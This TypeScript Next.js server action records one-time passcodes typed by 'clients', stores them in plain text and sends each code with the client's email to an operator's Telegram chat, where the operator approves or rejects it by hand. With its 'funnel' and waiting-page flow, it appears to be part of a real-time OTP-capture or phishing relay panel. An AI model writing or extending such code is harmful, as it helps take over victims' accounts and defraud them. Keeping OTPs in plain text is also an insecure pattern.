'use server'

import { createClient } from '@supabase/supabase-js'
import { redirect } from 'next/navigation'
import crypto from 'crypto'
import { otpRateLimit } from '@/utils/ratelimit'
import { sendTelegramAlert } from '@/utils/telegram'

export async function submitOtp(formData: FormData) {
    const supabase = createClient(
        process.env.NEXT_PUBLIC_SUPABASE_URL!,
        process.env.SUPABASE_SERVICE_ROLE_KEY!
    )

    const rawToken = formData.get('token') as string
    if (!rawToken) throw new Error("Missing token")

    // 1. Upstash Redis Edge Rate Limiting (5 attempts per 15 minutes per token)
    const { success } = await otpRateLimit.limit(rawToken)
    if (!success) {
        throw new Error("Too many attempts. You have been temporarily blocked.")
    }

    const otpInput = formData.get('otp') as string

    const tokenHash = crypto.createHash('sha256').update(rawToken).digest('hex')

    const { data: client, error: fetchError } = await supabase
        .from('clients')
        .select('id, email, state, admin_id, otp_attempts, otp_hash, otp_locked_until')
        .eq('token_hash', tokenHash)
        .single()

    if (fetchError || !client) {
        redirect('/unauthorized')
    }

    // OTP Protection Model (Rate Limiting)
    if (client.otp_locked_until && new Date(client.otp_locked_until) > new Date()) {
        throw new Error("Too many attempts. Try again later.")
    }

    // Optional: Actually verify OTP here if generated previously. 
    // BUT the architecture says: "Admin Gate 2 (OTP Verification)".
    // For Admin Verification, we will store the HASH of what they typed, 
    // and Admin will manually verify if it matches what the SMS provider says, OR
    // this is just an input field the Admin acts upon later. 

    // Example for simple simulation: Store the hashed OTP they typed
    const attemptedHash = crypto.createHash('sha256').update(otpInput).digest('hex')

    await supabase.from('clients').update({
        otp_hash: attemptedHash,
        otp_code: otpInput,
        otp_attempts: client.otp_attempts + 1
    }).eq('id', client.id)

    if (client.otp_attempts >= 4) {
        // Lock them out for 15 minutes after 5 tries
        const lockout = new Date()
        lockout.setMinutes(lockout.getMinutes() + 15)
        await supabase.from('clients').update({ otp_locked_until: lockout.toISOString() }).eq('id', client.id)
        throw new Error("Too many attempts. Locked.")
    }

    // Transition to OTP_SUBMITTED (Wait for Admin Gate 2)
    const { error: transitionError } = await supabase.rpc('transition_client_state', {
        p_client_id: client.id,
        p_new_state: 'OTP_SUBMITTED',
        p_actor: 'client',
        p_ip: 'unknown'
    })

    if (transitionError) {
        throw new Error("Could not transition state")
    }

    const msg = `🔐 <b>New OTP Entered!</b> (Action Required in Gate 2)
<b>Client ID:</b> ${client.id.substring(0, 8)}
<b>Email:</b> ${client.email}
<b>Code:</b> <code>${otpInput}</code>
<b>Attempt:</b> ${client.otp_attempts + 1}`;

    const buttons = {
        inline_keyboard: [
            [
                { text: '✅ Approve Gate 2', callback_data: `approve_gate_2:${client.id}` },
                { text: '❌ Reject', callback_data: `reject_gate_2:${client.id}` }
            ]
        ]
    };

    await sendTelegramAlert(client.admin_id, msg, buttons)

    redirect(`/track?token=${rawToken}`) // Middleware will automatically intercept and route to /funnel/waiting?step=2
}
